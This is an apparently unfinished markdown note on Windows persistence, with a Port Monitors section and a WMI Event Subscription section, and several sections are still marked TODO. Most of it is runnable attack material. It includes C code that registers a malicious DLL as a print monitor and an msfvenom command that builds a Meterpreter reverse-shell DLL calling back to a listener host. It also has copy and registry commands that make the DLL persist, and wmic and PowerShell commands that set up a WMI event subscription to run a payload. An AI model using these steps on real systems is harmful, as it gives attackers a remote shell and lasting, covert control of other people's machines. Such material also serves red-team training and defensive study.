# Port Monitors

The following code can be compiled to produce an executable called Monitors.exe that will perform the registration of the malicious DLL.

```
#include "Windows.h"
 
int main() {
    MONITOR_INFO_2 monitorInfo;
    TCHAR env[12] = TEXT("Windows x64");
    TCHAR name[12] = TEXT("Monitor");
    TCHAR dll[12] = TEXT("test.dll");
    monitorInfo.pName = name;
    monitorInfo.pEnvironment = env;
    monitorInfo.pDLLName = dll;
    AddMonitor(NULL, 2, (LPBYTE)&monitorInfo);
    return 0;
}
```

The DLL can be generated through Metasploit utility msfvenom by executing the following command:

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.2.21 LPORT=4444 -f dll > test.dll
```
The DLL needs to be copied into the System32 windows folder:
```
copy C:\Users\pentestlab\Desktop\test.dll C:\Windows\System32
```
From the command prompt executing the following application will perform the registration of the arbitrary DLL.
```
Monitors.exe
```
Persistence is achieved by creating the following registry key:
```
reg add "hklm\system\currentcontrolset\control\print\monitors\Pentestlab" /v "Driver" /d "test.dll" /t REG_SZ
```
# WMI Event Subscription 

TODO

```
wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="PentestLab", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="PentestLab", ExecutablePath="C:\Windows\System32\pentestlab.exe",CommandLineTemplate="C:\Windows\System32\pentestlab.exe"
wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"PentestLab\"", Consumer="CommandLineEventConsumer.Name=\"PentestLab\""
```

TODO

```
$FilterArgs = @{name='Pentestlab-WMI';
                EventNameSpace='root\CimV2';
                QueryLanguage="WQL";
                Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"};
$Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs
 
$ConsumerArgs = @{name='Pentestlab-WMI';
                CommandLineTemplate="$($Env:SystemRoot)\System32\pentestlab.exe";}
$Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs
 
$FilterToConsumerArgs = @{
Filter = [Ref] $Filter;
Consumer = [Ref] $Consumer;
}
$FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs
```

TODO
